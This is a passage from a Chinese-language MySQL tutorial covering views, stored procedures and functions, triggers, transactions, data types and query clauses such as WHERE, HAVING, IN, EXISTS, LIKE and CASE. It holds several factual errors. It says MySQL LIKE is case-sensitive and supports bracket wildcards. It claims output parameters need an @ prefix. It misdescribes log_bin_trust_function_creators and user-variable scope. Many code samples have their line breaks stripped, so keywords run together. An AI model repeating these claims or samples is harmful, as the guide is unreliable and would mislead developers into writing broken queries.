子句来限制待删除的记录数。例如，以下语句将会删除表 person 中前 10 行记录：\nDELETE FROM person LIMIT 10;\n\n如果要删除符合条件的前 10 行数据，则可以如下写：\nDELETE FROM person WHERE age &gt; 30 ORDER BY id LIMIT 10;\n\n在这个例子中，我们选择指定了 WHERE 条件和排序方式，并使用 LIMIT 限制了最多删除 10 行记录。\n视图\n将SELECT结果像表一样保存下来的虚表就是视图\n任何更改基本表的操作（如INSERT、UPDATE或DELETE）都会影响到视图的结果\n视图也可以和表一样进行SELECT、INSERT、UPDATE、DELETE……\n视图可以帮助简化复杂查询，提高查询性能\n\n创建视图使用CREATE VIEW语句可以在MySQL中创建视图。例如，以下是创建一个简单视图的示例：\nCREATE VIEW my_view ASSELECT column1, column2, ...FROM my_tableWHERE condition;\n\n在这个例子中，my_view是视图的名称，my_table是视图所依赖的基本表，SELECT查询表示视图的内容，并使用WHERE子句进行条件过滤。\n可更新视图在MySQL中，只有可更新视图（updatable view）才能使用UPDATE、INSERT或DELETE语句来更改基表的行数据。\n当满足以下条件之一时，视图将被标记为不可更新：\n\n视图包含聚合函数（如SUM或AVG）。\n视图中使用了DISTINCT、GROUP BY或HAVING子句。\n视图中的SELECT语句包含UNION或UNION ALL操作符。\n视图定义中存在子查询，而且子查询引用了与SELECT语句所引用的不同表。\n视图定义中存在常量或表达式，而不是列名。\n\n对视图执行INSERT操作时，即使与创建视图时的WHERE条件不匹配，数据也会插入到基表中。\n比如创建视图时指定了sales的范围：\nCREATE VIEW v1 ASSELECT empid, salesFROM tbWHERE sales &gt;= 100;\n\nINSERT数据时不在这个范围内：\nINSERT INTO v1 VALUES(&#x27;new_empid&#x27;, 15);\n\n执行之后，虽然视图v1中没有(‘new_empid’, 15)这条数据，但是基本表中已经INSERT成功，存在了这条数据。\n为避免这种情况发生，可以将视图设置为”不接受与条件不匹配的记录“，在CREATE VIEW时，添加WITH CHECK OPTION：\nCREATE VIEW v1 ASSELECT empid, salesFROM tbWHERE sales &gt;= 100WITH CHECK OPTION;\n\n这样就无法插入不符合条件的记录了。\n显示视图表和视图在显示上的操作是相同的，也是通过SHOW TABLES命令操作，视图会与表一起显示出来。\n要查看视图的列结构也是和表一样的操作\n显示视图view_name的列结构示例如下：\nDESC view_name;\n\n显示创建语句视图的SQL语句示例如下：\nSHOW CREATE VIEW view_name\n\n替换视图这里的替换视图的含义是删除已经存在的同名视图并创建新视图，操作方法是加上OR REPLACE：\nCREATE OR REPLACE VIEW v1 ASSELECT NOW();\n\n修改视图结构修改视图结构使用的也是ALTER命令，命令格式：\nALTER VIEW view_name AS (SELECT语句);\n\n删除视图如果存在就删除视图：\nDROP VIEW IF EXISTS v1;\n\nIF EXISTS的作用参见删除数据库。\n存储过程\nMySQL存储过程（Stored Procedure）是一组预编译的SQL语句集合，可以在数据库中重复运行使用\n将多个SQL语句组合成一个只需要使用命令”CALL * *“就能执行的集合，该集合就称为存储过程（stored process）\n\n创建存储过程存储过程由以下部分组成：\n\n存储过程名称：唯一标识存储过程的名称。\n\n参数列表：定义存储过程需要的输入或输出参数。\n\nSQL语句：实际执行的SQL语句集合。\n\n控制流程：定义存储过程如何处理条件、循环和异常等情况。\n\n\n以下是创建和使用MySQL存储过程的基本步骤：\n\n使用CREATE PROCEDURE语句创建存储过程：\n\nCREATE PROCEDURE procedure_name (IN input_parameter1 data_type1, IN input_parameter2 data_type2, OUT output_parameter data_type)BEGIN  -- SQL statements hereEND;\n\n其中，procedure_name为存储过程名称，input_parameter和output_parameter是存储过程的输入和输出参数，data_type指定了参数的数据类型。在BEGIN和END之间是定义的存储过程的SQL语句。\n在MySQL中，创建存储过程需要使用DELIMITER语句指定分隔符。默认情况下，MySQL使用分号（;）作为SQL语句和命令的分隔符。如果没有修改分隔符，MySQL会第一个分号视为存储过程定义语句的结束符，会导致错误。\n可以使用DELIMITER语句定义新的分隔符，例如“$$”，然后在存储过程结束时再将分隔符重置为默认值：\nDELIMITER $$CREATE PROCEDURE my_procedure()BEGIN  -- SQL statements hereEND $$DELIMITER ;\n\n注意，在上面的示例中，我们将分隔符从默认的分号设置为两个美元符号“$$”。当存储过程定义完毕后，我们需要将分隔符重置成分号以便后续操作。\n调用存储过程CALL procedure_name(input_value1, input_value2, @output_value);\n\n其中，input_value1和input_value2是存储过程的传入参数值，@output_value是存储过程的输出参数。您可以用SELECT语句检索@output_value的值。\n需要注意的是，MySQL存储过程支持条件、循环和异常处理等复杂的控制流程结构。存储过程可以将这些结构与SQL语句组合在一起，以完成特定的任务或操作。\n 存储过程的输出参数有个@的原因： \n在MySQL中，存储过程参数分为输入参数和输出参数。与输入参数不同，输出参数必须使用@前缀来声明。\n这是因为MySQL中的@符号表示用户定义变量（User-Defined Variables），可以在多个SQL语句之间传递值。当在存储过程中声明一个输出参数时，实际上是在创建一个用户定义变量，以便将结果从存储过程传递出去。\n例如，下面是一个简单的存储过程示例，它将两个整数相加，并将结果存储在输出参数中：\nCREATE PROCEDURE add_numbers(IN num1 INT, IN num2 INT, OUT result INT)BEGIN  SET result = num1 + num2;END;\n\n在执行该存储过程时，需要声明一个用户定义变量，并在调用存储过程时将其传递给输出参数：\nSET @output_value = 0;CALL add_numbers(10, 20, @output_value);SELECT @output_value;\n\n在上面的代码中，我们首先使用SET语句创建了一个名为@output_value的用户定义变量，并将其初始化为0。然后，我们调用了add_numbers存储过程，并将10和20作为输入参数传递给它。最后，我们使用SELECT语句检索输出参数的值。注意，我们使用了@前缀来引用输出参数。\n需要注意的是，在MySQL中，用户定义变量的作用域仅限于当前会话（Session）。这意味着在存储过程内部定义的用户定义变量不能在存储过程外部使用，反之亦然。\n显示存储过程要在MySQL中查看存储过程的定义，可以使用SHOW CREATE PROCEDURE语句。该语句将显示与存储过程相关的详细信息，包括存储过程名称、参数列表和SQL语句。\n以下是一个示例存储过程，它返回员工的姓名和薪水：\nCREATE PROCEDURE get_employee(IN employee_id INT, OUT employee_name VARCHAR(50), OUT employee_salary DECIMAL(10,2))BEGIN  SELECT name, salary INTO employee_name, employee_salary FROM employees WHERE id = employee_id;END;\n\n要查看该存储过程的定义，请执行以下语句：\nSHOW CREATE PROCEDURE get_employee;\n\n执行结果类似于下面的内容：\nProcedure: get_employeeCreate Procedure: CREATE PROCEDURE `get_employee`(IN employee_id INT, OUT employee_name VARCHAR(50), OUT employee_salary DECIMAL(10,2))BEGIN  SELECT name, salary INTO employee_name, employee_salary FROM employees WHERE id = employee_id;END\n\n其中，第一行显示了存储过程的名称（Procedure: get_employee），而第二行则显示了完整的CREATE PROCEDURE语句，包括存储过程的定义。\n需要注意的是，如果您没有对存储过程具有足够的权限，SHOW CREATE PROCEDURE语句可能会返回“Access denied”错误。在这种情况下，您需要确保已经授予了足够的权限，并且使用正确的MySQL用户来执行该语句。\n删除存储过程在MySQL中删除存储过程非常简单。您可以使用DROP PROCEDURE语句来删除一个或多个存储过程。\n以下是删除名为get_employee的存储过程的示例：\nDROP PROCEDURE IF EXISTS get_employee;\n\n在这个示例中，我们使用了DROP PROCEDURE语句来删除名称为get_employee的存储过程。如果该存储过程不存在，它将不会产生任何影响。如果存在同名的存储过程，则该命令将永久删除该存储过程，而无法撤消操作。\nIF EXISTS的作用参见前面章节的删除数据库。\n存储函数\n存储函数（stored function）的操作方法和存储过程基本相同，与存储过程的唯一不同是，存储函数在执行后只会返回一个值，主要用于返回单个值而不是执行操作。\n存储函数可以接受零个或多个输入参数，并返回一个标量值（例如整数、字符串、日期等）\n如果需要在SQL查询中计算一些复杂的表达式或逻辑，则可以使用存储函数来简化查询语句\nMySQL有许多函数，但使用存储函数可以创建自定义的函数，所以存储函数也称为用户定义函数\n\n启用存储函数日志当log_bin_trust_function_creators为0时，用户不能创建或更新存储函数。\n在MySQL中，log_bin_trust_function_creators是一个系统变量，它用于控制是否记录创建存储函数（CREATE FUNCTION语句）的操作到二进制日志中。这个变量的默认值为0（关闭，OFF），这意味着MySQL不会将CREATE FUNCTION语句记录到二进制日志中。把log_bin_trust_function_creators设置为1，将允许用户创建和修改存储函数，并且这些操作也将被记录到二进制日志中。\n需要注意的是，即使log_bin_trust_function_creators被设置为1，用户也需要适当的权限才能够创建、修改或删除存储函数。这包括CREATE ROUTINE、ALTER ROUTINE和DROP ROUTINE等权限。如果用户没有这些权限，则无法执行相关操作。\n要启用log_bin_trust_function_creators，可以采用以下方法：\n\n使用SET\nSET GLOBAL log_bin_trust_function_creators = 1;\n\n\n\n修改my.cnf\n[mysqld]log_bin_trust_function_creators = 1\n\n要查看log_bin_trust_function_creators，可以采用以下方法：\nSHOW VARIABLES LIKE &#x27;log_bin_trust_function_creators&#x27;;\n\n创建存储函数以下是一个计算两个整数之和的示例存储函数：\nCREATE FUNCTION add_numbers(num1 INT, num2 INT) RETURNS INTBEGIN  DECLARE result INT; -- 语法是 DECLARE 变量名 数据类型  SET result = num1 + num2;   -- 或者使用SELECT INTO，示例：SELECT AVG(sales) INTO result FROM tb;  RETURN result;END;\n\n在这个示例中，我们定义了一个名为add_numbers的存储函数，它接受两个整数作为输入参数，并返回它们的和。在存储函数内部，我们使用DECLARE语句声明了一个名为result的局部变量，并将num1和num2的和赋值给它。最后，我们使用RETURN语句返回result的值。\n要调用该存储函数，请使用SELECT语句进行查询：\nSELECT add_numbers(10, 20);\n\n在此查询中，我们调用了add_numbers函数，并传递了10和20作为两个输入参数。该函数将返回它们的和，即30。\n需要注意的是，在MySQL中，存储函数应该具有确定性，也就是说，对于相同的输入参数，它应该始终返回相同的结果。此外，存储函数还应该具有不产生副作用的性质，也就是说，它不应该修改数据库中的数据或执行任何有意义的操作。如果存储函数违反了这些规则，可能会导致不可预测的结果或安全问题。\n显示存储函数显示数据库中所有的存储函数你可以使用MySQL的SHOW FUNCTION STATUS语句来显示所有定义在数据库中的存储函数。\n具体来说，该语句的语法如下：\nSHOW FUNCTION STATUS;\n\n执行该语句将返回包含以下列的结果集：\n\nDb：与存储函数相关联的数据库名称。\nName：存储函数的名称。\nType：函数类型（标量函数 [SCALAR FUNCTION]、聚合函数 [AGGREGATE FUNCTION]、窗口函数 [WINDOW FUNCTION]）。\nDefiner：函数创建者。\nModified：最近一次修改时间。\nCreated：创建时间。\nSecurity_type：安全模式。\n\n此外，还有其他可选的列，例如Comment和character_set_client。\n如果你想查看特定表的存储函数，你需要在SHOW FUNCTION STATUS语句后面添加LIKE子句来指定要查询的模式，例如：\nSHOW FUNCTION STATUS LIKE &#x27;myfunction%&#x27;;\n\n上面的示例将返回名称以“myfunction”开头的所有存储函数。\n显示指定存储函数SHOW CREATE FUNCTION function_name;\n\n删除存储函数删除存储函数的语法格式是：\nDROP FUNCTION 存储函数名;\n\n触发器\nMySQL触发器（trigger）是一种数据库对象，它允许你在特定的表上定义自动执行的操作，当满足触发器定义的条件时，该操作将自动触发。\n常见的使用场景包括：\n\n在记录插入&#x2F;更新&#x2F;删除操作时自动生成日志记录。\n在记录插入&#x2F;更新&#x2F;删除操作时同步到其他相关的表。\n在记录插入&#x2F;更新时进行验证或格式化等操作。\n\n需要注意的是，MySQL触发器在处理大量数据时可能会显著减慢数据库性能，因此应谨慎使用。\n\n创建触发器一个MySQL触发器包含以下几个部分：\n\n触发器名称：用于标识触发器的名称。\n关联表名称：需要关联到触发器的表名。\n事件类型：可以是INSERT、UPDATE或DELETE，表示在关联表中执行的操作类型。\n触发时间：可以是BEFORE或AFTER，指定何时执行触发操作。\n条件：指定触发操作的条件，可以使SQL语句中的WHERE子句。\n触发操作：在满足触发器条件时要执行的操作，可以是一条或多条SQL语句。\n\n下面是一个创建MySQL触发器的示例：\nCREATE TRIGGER my_triggerAFTER INSERT ON my_tableFOR EACH ROWBEGIN    -- 触发操作END;\n\n在上述示例中，创建了一个名为my_trigger的触发器，设置为在my_table表中进行插入操作之后自动调用。FOR EACH ROW关键字表示该操作针对每个插入的行都会执行一次。在BEGIN和END之间的代码块则是要执行的SQL语句操作。\nOLD、NEW关键字在MySQL触发器中，可以使用OLD和NEW关键字来获取一个操作（如 INSERT、UPDATE 或 DELETE）的旧值和新值。\n\nOLD.列名\nOLD.列名是对表处理前的列值\nINSERT事件类型没有OLD.列名\n\nNEW.列名\nNEW.列名是对表处理后的列值\nDELETE事件类型没有NEW.列名\n\n\n示例：\nCREATE TRIGGER delete_triggerBEFORE DELETE ON employeeFOR EACH ROWBEGIN    INSERT INTO log_table (id_log_table, emp_id_log_table) VALUES (OLD.id, OLD.emp_id);END;\n\n在上述示例中，OLD关键字被用于访问将要被删除信息的行（旧行）。在此案例中，每次将要删除一行之前，都会将此行的ID和列1插入一个名为log_table的表中。\n显示触发器如果你想要显示MySQL数据库中的触发器，可以使用以下命令：\nSHOW TRIGGERS;\n\n当你执行上述命令时，将返回包含所有已创建触发器的结果集。该结果集包括每个触发器的名称、关联表、事件类型、触发时间和触发语句。\n如果你只想检索指定表的触发器，则可以使用以下语法：\nSHOW TRIGGERS FROM your_database_name LIKE &#x27;your_table_name&#x27;;\n\n需要将“your_database_name”替换为你要查询的数据库名称，“your_table_name”替换为你要查询的表名称。这条命令将返回满足特定条件的结果集。\n删除触发器要删除一个已经存在的MySQL触发器，可以使用以下语法：\nDROP TRIGGER [IF EXISTS] trigger_name;\n\n需要将“trigger_name”替换为你要删除的触发器的名称。可选的参数IF EXISTS表示如果该触发器不存在，也不会抛出错误并且继续执行下一个命令。\n事务\n将多个操作作为单个逻辑工作单元处理的功能称为事务（transaction）\n将事务开始的处理结果反映到数据库的操作称为提交（commit）\n不反映到数据库中而是保持恢复为原来状态的操作称为回滚（rollback）\n\n开启事务如果多个操作需要一起进行，可以将其放在一个事务中，以保证所有操作都要么全部成功，要么全部失败。\n在MySQL中，使用以下语句来开始一个事务：\nSTART TRANSACTION;-- 或者 BEGIN;-- 或者 BEGIN WORK;\n\nBEGIN和BEGIN WORK命令也可以用于开启一个新的事务。它们与START TRANSACTION命令作用相同，都可以开启一个新的事务，让后续的SQL语句在这个事务内执行。\n提交事务如果所有的操作都成功了，则使用以下语句来提交事务\nCOMMIT;\n\n在MySQL中，有一个自动提交（autocommit）功能，默认情况下开启。当执行单个SQL语句时，会自动将该语句的修改内容提交到数据库，即将其作为一个事务进行处理。\n如果需要关闭自动提交功能，则可以使用以下命令：\nSET autocommit = 0;\n\n这样，在执行多个SQL语句时，就需要手动调用START TRANSACTION或BEGIN、BEGIN WORK命令开始一个新的事务，再通过COMMIT日提交事务。例如：\nSET autocommit = 0;-- 开始一个新的事务BEGIN;-- 执行一些SQL语句INSERT INTO table1 (column1, column2) VALUES (value1, value2);-- 判断是否发生错误IF some_error_occured THEN    -- 回滚事务    ROLLBACK;ELSE    -- 提交事务    COMMIT;END IF;\n\n以上代码首先关闭了自动提交功能，然后使用BEGIN命令开始了一个新的事务，在其中执行了一些SQL语句，并根据情况选择了提交或回滚事务。\n回滚事务在MySQL中，使用ROLLBACK命令回滚事务，例如：\n-- 开始一个事务START TRANSACTION;-- 在事务中执行一系列的数据库操作-- 判断是否需要回滚事务IF some_condition THEN  -- 回滚事务  ROLLBACK;ELSE  -- 提交事务  COMMIT;END IF;\n\n在这个例子中，使用ROLLBACK回滚事务。\nBEGIN WORK;-- 或者 BEGIN;-- 或者 START TRANSACTION;-- 执行一些SQL操作SAVEPOINT sp1;-- 执行一些SQL操作ROLLBACK TO SAVEPOINT sp1;-- 执行一些SQL操作COMMIT;\n\n以上示例中，除了使用ROLLBACK命令回滚事务之外，还涉及到了MySQL事务中的保存点（SAVEPOINT）概念。保存点是指在事务内定义的一个标记，用于标识事务内某个时刻的状态。当事务遇到错误并进行回滚时，可以将事务恢复到保存点所标识的状态。\n数据类型数据库表列中的数据的种类成为数据类型\n二进制数据类型\n\n\n数据类型\n含义\n对应范围\n\n\n\nBLOB\n存储二进制大型对象的数据类型\n最多可以存储65535个字节\n\n\n数值型数据类型\n\n\n数据类型\n含义\n对应范围\n\n\n\nTINYINT\n极小整数值\n-128 到 127（有符号），0 到 255（无符号）\n\n\nSMALLINT\n小整数值\n-32768 到 32767（有符号），0 到 65535（无符号）\n\n\nMEDIUMINT\n中等大小的整数值\n-8388608 到 8388607（有符号），0 到 16777215（无符号）\n\n\nINT\n常规大小的整数值\n-2147483648 到 2147483647（有符号），0 到 4294967295（无符号）\n\n\nBIGINT\n非常大的整数值\n-9223372036854775808 到 9223372036854775807（有符号），0 到 18446744073709551615（无符号）\n\n\nFLOAT\n单精度浮点数\n精度大约为 7 位小数\n\n\nDOUBLE\n双精度浮点数\n精度大约为 15 位小数\n\n\nDECIMAL\n精确的小数值，用于存储精确的数值，如货币\n精度可达 65 位，小数部分最多 30 位\n\n\n输入的数值型数据可以采用指数表示法输入，在指数表示法输入的情况下，“AE+B”表示“A乘以10的B次方”，例如“6.02*10的23次方”可以表示为“6.02E+23”。\n字符串型数据类型\n\n\n数据类型\n含义\n对应范围\n\n\n\nCHAR\n定长字符串，长度固定\n0 到 255 字节\n\n\nVARCHAR\n变长字符串，长度可变\n0 到 65535 字节\n\n\nTINYTEXT\n很小的文本字符串\n0 到 255 字节\n\n\nTEXT\n小到中等大小的文本字符串\n0 到 65535 字节\n\n\nMEDIUMTEXT\n中等大小的文本字符串\n0 到 16777215 字节\n\n\nLONGTEXT\n大文本字符串\n0 到 4294967295 字节\n\n\nENUM\n字符串对象，只能有一组预定义的值，并且值的数量不能超过 65535\n1 或 2 字节，根据枚举值的数量\n\n\nSET\n字符串对象，可以有多个值，值的数量不能超过 64\n1、2、3、4 或 8 字节，根据集合值的数量\n\n\n输入的字符串如果有“’”，需要转义处理，改为“\\‘”\nMySQL4.1版本之后，VARCHAR和CHAR的()中指定的位数单位变为“字符”，以VARCHAR(10)为例，不管输入的是中文还是英文还是数字，最多只能保留10个字符\nVARCHAR的字符范围：\n在MySQL 5.0.3及更高版本中，VARCHAR可以存储最多65535字节的数据，这包括存储长度的1到2个字节。实际的最大字符串长度由最大行大小（默认为65535字节）和使用的字符集决定。\n例如，如果使用utf8字符集（最多需要3字节来存储一个字符），则VARCHAR可以存储最多21845个字符（65535&#x2F;3，舍去小数）。如果使用utf8mb4字符集（最多需要4字节来存储一个字符），则VARCHAR可以存储最多16383个字符（65535&#x2F;4，舍去小数）。\n在MySQL 5.0.2及更低版本中，VARCHAR可以存储最多255个字符。\n日期和时间型数据类型\n\n\n数据类型\n含义\n对应范围\n\n\n\nYEAR\n年份\n1901 到 2155（4位时），以及19702069（2位时，7069）\n\n\nDATE\n日期\n‘1000-01-01’ 到 ‘9999-12-31’\n\n\nTIME\n时间\n‘-838:59:59’ 到 ‘838:59:59’\n\n\nDATETIME\n日期和时间组合\n‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’\n\n\nTIMESTAMP\n时间戳\n‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-19 03:14:07’ UTC\n\n\nMySQL中的时间类型还支持小数秒，例如 DATETIME(3)、TIME(3) 或 TIMESTAMP(3) 可以存储精确到毫秒的时间。在括号中的数字表示小数秒的精度。\n字符集和比较规则MySQL的字符集和比较规则有四个级别，分别是服务器级别、数据库（schema）级别、表（table）级别、列级别。\n查看字符集的语法：\nSHOW (CHARACTER SET|CHARSET) [LIKE 匹配的模式];\n\n查看比较规则的语法：\nSHOW COLLATION [LIKE 匹配的模式];\n\n从客户端发送请求给服务器到服务器接收请求并返回结果的过程中发生的字符转换包括：\n\n客户端发送的请求字节序列是采用哪种字符集进行编码。\n与启动选项default-character-set有关。\n\n服务器收到客户端的请求后认为客户端是采用哪种字符集进行编码的。\n与系统变量character-set-client有关。\n\n服务器在运行过程中会把请求的字节序列转化为以哪种字符集编码的字节序列。\n与系统变量character-set-connection有关。\n\n服务器向客户端返回字节序列时会采用哪种字符集进行编码。\n与系统变量character-set-result有关。\n\n客户端在收到字节序列的响应后的怎样将字节序列写到控制台中。\n与启动选项default-character-set有关。\n\n\n关键字WHERE在MySQL中，WHERE子句用于在查询中指定条件，以过滤出满足特定条件的记录。以下是WHERE子句的基本语法：\nSELECT column1, column2, ...FROM table_nameWHERE condition;\n\n在这里，column1, column2, … 是你想要从表中选择的列的名称，table_name 是你想要查询的表的名称，condition 是用于确定哪些记录应该被返回的条件。\n以下是一些使用WHERE子句的例子：\n\n基于单个条件的查询：\n SELECT * FROM students WHERE age &gt; 20;\n\n 这个查询将返回年龄大于 20 的所有学生记录。\n\n基于多个条件的查询：\n SELECT * FROM students WHERE age &gt; 20 AND gender = &#x27;Female&#x27;;\n\n 这个查询将返回年龄大于 20 并且性别为女性的学生记录。\n\n使用比较运算符的查询：\n SELECT * FROM students WHERE age BETWEEN 18 AND 25;\n\n 这个查询将返回年龄在 18 到 25 之间的学生记录。\n\n使用逻辑运算符的查询：\n SELECT * FROM students WHERE age &gt; 20 OR gender = &#x27;Female&#x27;;\n\n 这个查询将返回年龄大于 20 或性别为女性的学生记录。\n\n\n请注意，WHERE子句可以使用比较运算符（如 =, &lt;&gt;, &lt;, &gt;, &lt;=, &gt;=），逻辑运算符（如 AND, OR, NOT），以及其他条件表达式（如 IN, LIKE, IS NULL 等）来构建复杂的条件。\nWHERE可以对GROUP BY分组前的记录进行过滤，即在如下语句中，WHERE在GROUP BY之前执行：\nSELECT\tempid, AVG(sales)FROM\tWHERE sales &gt;= 50GROUP BY empid;\n\nHAVING在MySQL中，HAVING子句只能和GROUP BY子句搭配使用，HAVING子句用于在GROUP BY子句后对分组结果进行筛选，而且只能对聚合函数进行过滤和筛选。而GROUP BY子句则是将原始数据集按照指定的列进行分组，生成多个子集，并可使用聚合函数对每个子集进行计算，HAVING是在分组后执行的。\n在执行GROUP BY子句之后，可以使用HAVING子句来进一步筛选符合条件的结果集。\n在MySQL中，HAVING子句用于在GROUP BY子句后对分组结果进行筛选。它允许你使用聚合函数和条件来过滤分组后的结果集。\n以下是HAVING的基本语法：\nSELECT column1, column2, ..., aggregate_function(column)FROM table_nameGROUP BY column1, column2, ...HAVING condition;\n\n在这里，column1, column2, … 是你想要从表中选择的列的名称，table_name 是你想要查询的表的名称，aggregate_function 是一个聚合函数（如 SUM, COUNT, AVG 等），column 是你想要按照其进行分组的列，condition 是用于筛选结果的条件。\n以下是一个例子：\nSELECT department, COUNT(*) as total_studentsFROM students\tGROUP BY departmentHAVING COUNT(*) &gt; 10;\n\n这个查询将根据学生表中的department列对记录进行分组，并计算每个部门的学生人数。然后，HAVING子句筛选出具有超过 10 名学生的部门。\n请注意，HAVING子句在查询中的位置很重要，它通常出现在GROUP BY子句之后，ORDER BY子句之前。与WHERE子句不同，HAVING子句可以使用聚合函数和列的别名来指定条件。\n另外，如果你只想筛选单个表中的数据而不进行分组，你可以使用WHERE子句。HAVING子句主要用于筛选分组后的结果。\nBETWEEN在MySQL中，BETWEEN是一个比较运算符，用于检查一个值是否在指定的一组或区间内。它能够用于数字，日期和时间等数据类型。\nBETWEEN语法如下：\nvalue BETWEEN low AND high;\n\n其中，value是需要进行比较的值，low和high是指定的区间范围。对于数字类型的值来说，BETWEEN会返回一个布尔值，表示这个值是否在区间范围内；而对于日期和时间类型的值来说，BETWEEN则会将这个值转换为一个日期&#x2F;时间对象后再进行比较。\n例如，假设我们有一个名为orders的表格，其中包含了订单的信息，包括订单编号、下单日期和订单总额等。如果我们想要查询某一段时间内的订单，可以使用BETWEEN关键字来实现，如下所示：\nSELECT * FROM orders WHERE order_date BETWEEN &#x27;2021-01-01&#x27; AND &#x27;2021-03-31&#x27;;\n\n这条语句查询了从2021年1月1日到2021年3月31日之间的订单信息。\n需要注意的是，在使用BETWEEN时，应该确保low和high的顺序正确，即low应该小于等于high。否则会导致结果不准确。同时也需要注意数据类型的匹配问题，避免类型不匹配的情况。\nIN在MySQL中，IN是一个逻辑运算符，它允许你在WHERE或HAVING子句中指定多个值。以下是其基本语法：\nSELECT column1, column2, ...FROM table_nameWHERE column_name IN (value1, value2, ...);\n\n在这个语句中，column1, column2, … 是你想从表中选择的列的名称，table_name是你想从中选择数据的表的名称，column_name是你想要应用条件的列的名称，value1, value2, … 是你想在列中查找的值。\n例如，如果你想从students表中选择名字为’John Doe’或’Jane Doe’的学生，你可以这样做：\nSELECT * FROM students WHERE name IN (&#x27;John Doe&#x27;, &#x27;Jane Doe&#x27;);\n\nIN运算符等价于多个OR条件。上面的查询等价于以下查询：\nSELECT * FROM students WHERE name = &#x27;John Doe&#x27; OR name = &#x27;Jane Doe&#x27;;\n\n你还可以在IN子句中使用子查询来动态生成值的列表。例如，以下查询会选择所有在courses表中有记录的学生：\nSELECT * FROM students WHERE id IN (SELECT student_id FROM courses);\n\n在这个例子中，子查询SELECT student_id FROM courses会返回所有在courses表中有记录的学生的ID，然后主查询会从students表中选择这些ID对应的学生。\n“&#x3D;”不能代替IN，因为“&#x3D;”在返回结果多于一条的时候会报错，“Subquery returns more than 1 row”。\nEXISTS在MySQL中，EXISTS是一个条件运算符，用于检查一个子查询是否返回了任何行。它通常与SELECT语句的WHERE子句一起使用。\n以下是EXISTS的基本语法：\nSELECT column1, column2, ...FROM table_nameWHERE EXISTS (subquery);\n\n在这里，column1, column2, … 是你想要从表中选择的列的名称，table_name 是你想要查询的表的名称，subquery 是一个子查询，它可以是一个完整的SELECT语句。\n以下是一个例子：\nSELECT nameFROM studentsWHERE EXISTS (    SELECT *    FROM courses    WHERE courses.student_id = students.id);\n\n这个查询将返回在students表中存在对应课程的学生的姓名。子查询检查是否存在与students表中的学生关联的记录在courses表中。\nEXISTS运算符返回布尔值（TRUE或FALSE），如果子查询返回至少一行，则为TRUE，否则为FALSE。它通常用于WHERE子句中作为一个条件来过滤查询结果。\n请注意，EXISTS子查询可以是任意复杂的查询，它可以包含聚合函数、子查询、连接等。在使用EXISTS时，关联子查询通常使用相关列来建立条件，以与外部查询进行关联。\nLIKE在MySQL中，LIKE是一个用于模式匹配的操作符，通常用于WHERE子句中以过滤符合特定模式的数据。\n以下是LIKE的基本语法：\nSELECT column1, column2, ...FROM table_nameWHERE column_name LIKE pattern;\n\n在这里，column1, column2, … 是你想要从表中选择的列的名称，table_name 是你想要查询的表的名称，column_name 是你想要应用模式匹配的列的名称，pattern 是匹配模式。\nLIKE操作符使用通配符来匹配模式，常用的通配符有：\n\n%：匹配任意字符（包括零个字符）。\n_：匹配任意单个字符。\n[characters]：匹配指定字符集中的任意单个字符。\n[^characters]：匹配不在指定字符集中的任意单个字符。\n\n以下是一些使用LIKE的例子：\n\n以特定字符开头的匹配：\n SELECT * FROM students WHERE name LIKE &#x27;J%&#x27;;\n\n 这个查询将返回名字以字母 ‘J’ 开头的所有学生记录。\n\n以特定字符结尾的匹配：\n SELECT * FROM students WHERE email LIKE &#x27;%example.com&#x27;;\n\n 这个查询将返回邮箱以 ‘@example.com’ 结尾的所有学生记录。\n\n包含特定字符的匹配：\n SELECT * FROM students WHERE name LIKE &#x27;%Doe%&#x27;;\n\n 这个查询将返回名字中包含 ‘Doe’ 的所有学生记录。\n\n指定单个字符的匹配：\n SELECT * FROM students WHERE name LIKE &#x27;_ohn&#x27;;\n\n 这个查询将返回名字为四个字符并以 ‘ohn’ 结尾的所有学生记录，其中第二个字符可以是任意字符。\n\n\n请注意，LIKE匹配区分大小写，如果需要不区分大小写的匹配，可以使用COLLATE关键字指定不区分大小写的字符集，如 WHERE column_name COLLATE utf8_general_ci LIKE pattern;。\nCASE WHENMySQL 的 CASE WHEN 是一种条件表达式，它类似于其他编程语言中的 switch 或 if-then-else 结构。它可以在 SELECT 语句中使用，根据一个或多个条件返回不同的值。\nCASE WHEN 语法的基本结构如下：\nCASE expressionWHEN value_1 THEN result_1WHEN value_2 THEN result_2...ELSE default_resultEND\n\nCASE 关键字后面的 expression 是要检查的值或表达式，value_x 是与 expression 进行比较的值，而 result_x 则是与 value_x 对应的结果。如果 expression 和某个 value_x 相匹配，则会返回对应的 result_x。如果都没有匹配，将会执行 ELSE 子句中指定的 default_result（可选的，如果没有 ELSE 子句，将返回 NULL）。\n以下是一个简单的例子，演示了如何在 SELECT 语句中使用 CASE WHEN：\nSELECT employee_name, CASE department_id\tWHEN 1 THEN &#x27;Sales&#x27;    WHEN 2 THEN &#x27;Marketing&#x27;    ELSE &#x27;Other&#x27;END as departmentFROM employees;\n\n这条语句查询了一个名为 employees 的表格，其中包含员工信息，包括姓名、部门编号等。它使用 CASE WHEN 结构来把部门编号转换为对应的文本描述，最终会返回每个员工的名称和所在部门的文本标签。\n需要注意的是，CASE WHEN 也支持复杂的判断逻辑和多个条件，可以使用嵌套和逻辑运算符来实现复杂的条件判断。\n以下是CASE WHEN的另一个例子：\nSELECT id,CASE\tWHEN sales &gt;= 100 THEN &#x27;高&#x27;\tWHEN sales &gt;= 50 THEN &#x27;中等&#x27;    ELSE &#x27;低&#x27;END AS &#x27;评价&#x27;FROM tb;\n\nIF ELSE在MySQL中，可以使用IF和THEN关键字来实现条件语句。基本语法如下所示：\nIF condition THEN    statement(s);ELSE    statement(s);END IF;\n\n其中，如果“condition”（条件）为真，则执行THEN子句中的一个或多个语句，否则执行ELSE子句中的一个或多个语句。ELSE&#96;块是可选的。\n让我们看一个实际的例子：\nSET @score = 80;IF @score &gt;= 60 THEN    SELECT &#x27;Pass&#x27;;ELSE    SELECT &#x27;Fail&#x27;;END IF;\n\n在上述示例中，将变量@score设置为80分。然后，使用IF语句检查是否及格（分数大于等于60）。如果成立，则输出“Pass”，否则输出“Fail”。\nORDER BY和ACS或DESC在MySQL中，你可以使用ORDER BY子句对查询结果进行排序。ORDER BY子句可以指定按照一个或多个列进行升序（默认）或降序排序。\n以下是ORDER BY子句的基本语法：\nSELECT column1, column2, ...FROM table_nameORDER BY column1 [ASC|DESC], column2 [ASC|DESC], ...;\n\n在这里，column1, column2, … 